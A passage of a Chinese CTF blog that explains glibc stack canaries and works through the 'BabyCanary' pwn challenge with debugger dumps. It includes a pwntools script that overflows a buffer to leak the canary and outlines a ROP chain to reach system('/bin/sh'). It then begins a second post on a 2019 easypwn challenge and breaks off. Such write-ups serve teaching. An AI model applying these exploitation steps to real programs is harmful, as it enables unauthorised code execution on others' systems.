sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>

<p>如果存在溢出可以覆盖位于 <strong>TLS</strong> 中保存的 <strong>Canary</strong> 值那么就可以实现绕过保护机制。</p>
<p>事实上，<strong>TLS</strong> 中的值由函数 <strong>security_init</strong> 进行初始化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">security_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>

<p>总的来说检测的机制是这样的：</p>
<p>1.程序从一个神奇的地方取出一个4（<strong>eax</strong>，32位系统）或8（<strong>rax</strong>，64位系统）节的值，在32位程序上，你可能会看到</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1122569b3258873874d61fd5bfc62fba.png" alt></p>
<p>在64位上，你可能会看到</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1d676e1ed18ade8675f112f61e39ab74.png" alt></p>
<p>放到栈上以后，<strong>eax</strong>中的副本也会被清空（<strong>xor eax,eax</strong>）</p>
<p>2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把<strong>canary</strong>的值取出来，和之前放在栈上的<strong>canary</strong>进行比较，如果因为栈溢出什么的原因覆盖到了<strong>canary</strong>而导致<strong>canary</strong>发生了变化则直接终止程序</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1acfdb1810a2876c78383f4a3a66a515.png" alt></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_b151b13af2155fff6a842855cbbd4d07.png" alt></p>
<h2 id="BabyCanary"><a href="#BabyCanary" class="headerlink" title="BabyCanary"></a>BabyCanary</h2><p>我们先检查一下程序情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>可以得知开启了<strong>Canary</strong>防护和<strong>NX</strong>防护</p>
<p><strong>main</strong>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_4006F9();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_4006F9</strong>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4006F9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tell me your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OK,%s,let start!\n"</span>, &amp;buf);</span><br><span class="line">  sub_400696();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_4006F9</strong>函数中使用<strong>read</strong>函数获取输入，然后使用<strong>printf</strong>函数直接输出，存在格式化字符串漏洞，可以泄露内存</p>
<p>大体思路就是通过格式化字符串读取<strong>canary</strong>的值，然后在栈溢出的<strong>padding</strong>块把<strong>canary</strong>所在位置的值用正确的<strong>canary</strong>替换，从而绕过<strong>canary</strong>的检测</p>
<p>观察得到Canary的生成代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004006F</span>9                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004006F</span>A                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004006F</span>D                 sub     rsp, <span class="number">90</span>h</span><br><span class="line">.text:<span class="number">0000000000400704</span> ; <span class="number">5</span>:   v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">.text:<span class="number">0000000000400704</span>                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">000000000040070</span>D                 mov     [rbp+var_8], rax</span><br><span class="line">.text:<span class="number">0000000000400711</span> ; <span class="number">6</span>:   <span class="built_in">puts</span>(<span class="string">"tell me your name:"</span>);</span><br><span class="line">.text:<span class="number">0000000000400711</span>                 xor     eax, eax</span><br></pre></td></tr></table></figure>

<p>我们使用<strong>GDB</strong>调试，先下一个断点到<strong>0x00000000004006F9</strong>，查看一下汇编情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x4006f9    push   rbp</span><br><span class="line">  0x4006fa    mov    rbp, rsp</span><br><span class="line">  0x4006fd    sub    rsp, 0x90</span><br><span class="line">  0x400704    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">  0x40070d    mov    qword ptr [rbp - 8], rax</span><br><span class="line">  0x400711    xor    eax, eax</span><br><span class="line">  0x400713    mov    edi, 0x400824</span><br><span class="line">  0x400718    call   0x400560</span><br><span class="line">  0x40071d    lea    rax, [rbp - 0x90]</span><br><span class="line">  0x400724    mov    edx, 0x100</span><br><span class="line">  0x400729    mov    rsi, rax</span><br></pre></td></tr></table></figure>

<p>一直单步运行直至异或eax寄存器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  0x4006f9    push   rbp</span><br><span class="line">  0x4006fa    mov    rbp, rsp</span><br><span class="line">  0x4006fd    sub    rsp, 0x90</span><br><span class="line">  0x400704    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">  0x40070d    mov    qword ptr [rbp - 8], rax</span><br><span class="line">► 0x400711    xor    eax, eax</span><br><span class="line">  0x400713    mov    edi, 0x400824</span><br><span class="line">  0x400718    call   0x400560</span><br><span class="line">  0x40071d    lea    rax, [rbp - 0x90]</span><br><span class="line">  0x400724    mov    edx, 0x100</span><br><span class="line">  0x400729    mov    rsi, rax</span><br></pre></td></tr></table></figure>

<p>查看此时栈上的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx $rbp</span><br><span class="line">0x7fffffffde40:	0x00007fffffffde50	0x000000000040077e</span><br><span class="line">0x7fffffffde50:	0x0000000000400790	0x00007ffff7a2d830</span><br><span class="line">0x7fffffffde60:	0x00007fffffffdf38	0x00007fffffffdf38</span><br><span class="line">0x7fffffffde70:	0x00000001f7b99608	0x0000000000400770</span><br><span class="line">0x7fffffffde80:	0x0000000000000000	0x5dbdf3d3bbac9a43</span><br><span class="line">0x7fffffffde90:	0x00000000004005a0	0x00007fffffffdf30</span><br><span class="line">0x7fffffffdea0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffdeb0:	0xa2420cac084c9a43	0xa2421c161b5c9a43</span><br><span class="line">0x7fffffffdec0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffded0:	0x0000000000000000	0x00007fffffffdf48</span><br></pre></td></tr></table></figure>

<p>得知canary的值在<code>[rbp - 8]</code>处，则我们直接查看这里的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope $rbp-8</span><br><span class="line">00:0000│      0x7fffffffde38 ◂— 0xca64b11c5d706100</span><br><span class="line">01:0008│ rbp  0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">02:0010│      0x7fffffffde48 —▸ 0x40077e ◂— mov    eax, 0</span><br><span class="line">03:0018│      0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">04:0020│      0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">05:0028│      0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— &apos;/home/syc/Documents/challange/babycanary/babycanary&apos;</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7fffffffde70 ◂— 0x1f7b99608</span><br></pre></td></tr></table></figure>

<p>可以得知<strong>Canary</strong>的值就是 <strong>0xca64b11c5d706100</strong></p>
<p>但是问题是我们发现这题其实并不能使用格式化字符串实现泄露<strong>Canary</strong>的地址，因为它使用的是<strong>Read</strong>函数，并不会在后面添加<strong>“0/”</strong>截断，无法被解析也就无法利用格式化字符串漏洞。我们只能使用栈溢出直接输出<strong>Canary</strong>函数</p>
<p>我们先构造一个长度为<strong>90</strong>的字符串先尝试一下，下一个断点在<strong>0x0000000000400736</strong>(<strong>printf</strong>函数)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Documents/challange$ python pattern.py create 128</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae</span><br></pre></td></tr></table></figure>

<p>然后运行在断点处查看栈结构</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rsi rsp  0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')</span><br><span class="line">01:0008│          0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')</span><br><span class="line">02:0010│          0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')</span><br><span class="line">03:0018│          0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')</span><br><span class="line">04:0020│          0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')</span><br><span class="line">05:0028│          0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')</span><br><span class="line">06:0030│          0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')</span><br><span class="line">07:0038│          0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')</span><br><span class="line">08:0040│          0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')</span><br><span class="line">09:0048│          0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')</span><br><span class="line">0a:0050│          0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')</span><br><span class="line">0b:0058│          0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')</span><br><span class="line">0c:0060│          0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')</span><br><span class="line">0d:0068│          0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')</span><br><span class="line">0e:0070│          0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')</span><br><span class="line">0f:0078│          0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')</span><br><span class="line">10:0080│          0x7fffffffde30 —▸ 0x40070a ◂— add    byte ptr [rax], al</span><br><span class="line">11:0088│          0x7fffffffde38 ◂— 0x8b5843fb32c04100</span><br><span class="line">12:0090│ rbp      0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">13:0098│          0x7fffffffde48 —▸ 0x40077e ◂— mov    eax, 0</span><br><span class="line">14:00a0│          0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">15:00a8│          0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">16:00b0│          0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— '/home/syc/Documents/challange/babycanary/babycanary'</span><br><span class="line">... ↓</span><br><span class="line">18:00c0│          0x7fffffffde70 ◂— 0x1f7b99608</span><br><span class="line">19:00c8│          0x7fffffffde78 —▸ 0x400770 ◂— push   rbp</span><br><span class="line">1a:00d0│          0x7fffffffde80 ◂— 0x0</span><br><span class="line">1b:00d8│          0x7fffffffde88 ◂— 0x4b03463a62f1fbbf</span><br><span class="line">1c:00e0│          0x7fffffffde90 —▸ 0x4005a0 ◂— xor    ebp, ebp</span><br><span class="line">1d:00e8│          0x7fffffffde98 —▸ 0x7fffffffdf30 ◂— 0x1</span><br><span class="line">1e:00f0│          0x7fffffffdea0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">20:0100│          0x7fffffffdeb0 ◂— 0xb4fcb945d111fbbf</span><br><span class="line">21:0108│          0x7fffffffdeb8 ◂— 0xb4fca9ffc201fbbf</span><br><span class="line">22:0110│          0x7fffffffdec0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">25:0128│          0x7fffffffded8 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2dd ◂— 'XDG_VTNR=7'</span><br><span class="line">26:0130│          0x7fffffffdee0 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">27:0138│          0x7fffffffdee8 —▸ 0x7ffff7de77db (_dl_init+139) ◂— jmp    0x7ffff7de77b0</span><br><span class="line">28:0140│          0x7fffffffdef0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">2a:0150│          0x7fffffffdf00 —▸ 0x4005a0 ◂— xor    ebp, ebp</span><br><span class="line">2b:0158│          0x7fffffffdf08 —▸ 0x7fffffffdf30 ◂— 0x1</span><br><span class="line">2c:0160│          0x7fffffffdf10 ◂— 0x0</span><br><span class="line">2d:0168│          0x7fffffffdf18 —▸ 0x4005c9 ◂— hlt    </span><br><span class="line">2e:0170│          0x7fffffffdf20 —▸ 0x7fffffffdf28 ◂— 0x1c</span><br><span class="line">2f:0178│          0x7fffffffdf28 ◂— 0x1c</span><br><span class="line">30:0180│ r13      0x7fffffffdf30 ◂— 0x1</span><br><span class="line">31:0188│          0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂—</span><br></pre></td></tr></table></figure>

<p>从<code>11:0088│          0x7fffffffde38 ◂— 0x8b5843fb32c04100</code>可以知道这就是<strong>Canary</strong>的值，那我们还需要增加字符串长度，正好溢出到canary的位置，则根据计算<strong>hex(30-28=8)</strong>,则需要生成<strong>136</strong>个字符</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Documents/challange$ python pattern.py create 136</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rax rsi rsp  0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')</span><br><span class="line">01:0008│              0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')</span><br><span class="line">02:0010│              0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')</span><br><span class="line">03:0018│              0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')</span><br><span class="line">04:0020│              0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')</span><br><span class="line">05:0028│              0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')</span><br><span class="line">06:0030│              0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')</span><br><span class="line">07:0038│              0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')</span><br><span class="line">08:0040│              0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')</span><br><span class="line">09:0048│              0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')</span><br><span class="line">0a:0050│              0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')</span><br><span class="line">0b:0058│              0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')</span><br><span class="line">0c:0060│              0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')</span><br><span class="line">0d:0068│              0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')</span><br><span class="line">0e:0070│              0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')</span><br><span class="line">0f:0078│              0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')</span><br><span class="line">10:0080│              0x7fffffffde30 ◂— 0x4134654133654132 ('2Ae3Ae4A')</span><br><span class="line">11:0088│              0x7fffffffde38 ◂— 0xfb83dc38787b3d0a</span><br><span class="line">12:0090│ rbp          0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br></pre></td></tr></table></figure>

<p>可以看到Canary的值就是<strong>0xfb83dc38787b3d0a</strong></p>
<p>这样子我们可以写一个脚本来暴露Canary的值了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./babycanary"</span>)</span><br><span class="line">gdb.attach(r,<span class="string">"b *0x400736"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">136</span></span><br><span class="line">r.sendlineafter(<span class="string">"tell me your name:\n"</span>,payload)</span><br><span class="line">r.recvuntil(<span class="string">'OK,'</span>+ <span class="string">"a"</span>*<span class="number">136</span>)</span><br><span class="line">canary = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary :"</span> + hex(canary)</span><br></pre></td></tr></table></figure>

<p>运行后可以得到Canary的值为：<strong>0xbc2b48de6267a90a</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xa5 bytes:</span><br><span class="line">    00000000  4f 4b 2c 61  61 61 61 61  61 61 61 61  61 61 61 61  │OK,a│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000080  61 61 61 61  61 61 61 61  61 61 61 0a  a9 67 62 de  │aaaa│aaaa│aaa·│·gb·│</span><br><span class="line">    00000090  48 2b bc 70  cc 8b ca ff  7f 2c 6c 65  74 20 73 74  │H+·p│····│·,le│t st│</span><br><span class="line">    000000a0  61 72 74 21  0a                                     │art!│·│</span><br><span class="line">    000000a5</span><br><span class="line">canary :0xbc2b48de6267a90a</span><br></pre></td></tr></table></figure>

<p>通过GDB调试可以查看</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rax rsi rsp  0x7fffca8bcbd0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line">... ↓</span><br><span class="line">11:0088│              0x7fffca8bcc58 ◂— 0xbc2b48de6267a90a</span><br><span class="line">12:0090│ rbp          0x7fffca8bcc60 —▸ 0x7fffca8bcc70 —▸ 0x400790 ◂— push   r15</span><br><span class="line">13:0098│              0x7fffca8bcc68 —▸ 0x40077e ◂— mov    eax, 0</span><br><span class="line">14:00a0│              0x7fffca8bcc70 —▸ 0x400790 ◂— push   r15</span><br><span class="line">15:00a8│              0x7fffca8bcc78 —▸ 0x7fd06a5f1830 (__libc_start_main+240)</span><br></pre></td></tr></table></figure>

<p>我们的脚本是正确的，我们已经获取了绕过Canary，接下来就是普通的栈溢出题目了</p>
<p>可以覆盖返回地址为<strong>pop pop pop pop ret</strong>指令地址，返回时弹出<strong>0x18</strong>个填充字节和返回地址,返回到<strong>buf+0x20</strong>处，就避开了栈不可执行</p>
<p>在<strong>buf+0x20</strong>处构造<strong>ROP</strong>，通过write函数，先泄露<strong>libc</strong>基地址，返回到<strong>start</strong></p>
<p>重新执行，输入使之执行<strong>system(‘/bin/sh’)</strong></p>
<p>需要用到的信息，包括<strong>bss</strong>段的地址、<strong>main</strong>函数地址、程序中已有函数的地址、<strong>gadgets</strong>地址</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/18/║┌╢▄▒¡-2019-PWN-easypwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/18/║┌╢▄▒¡-2019-PWN-easypwn/" class="post-title-link" itemprop="url">黑盾杯-2019-PWN-easypwn</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-18 05:30:12 / Modified: 20:30:44" itemprop="dateCreated datePublished" datetime="2019-09-18T05:30:12-07:00">2019-09-18</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>首先检查一下程序保护措施</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>可以发现程序开启了<strong>NX</strong>保护即栈不可执行保护，我们再开启<strong>IDA Pro</strong>进行反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, 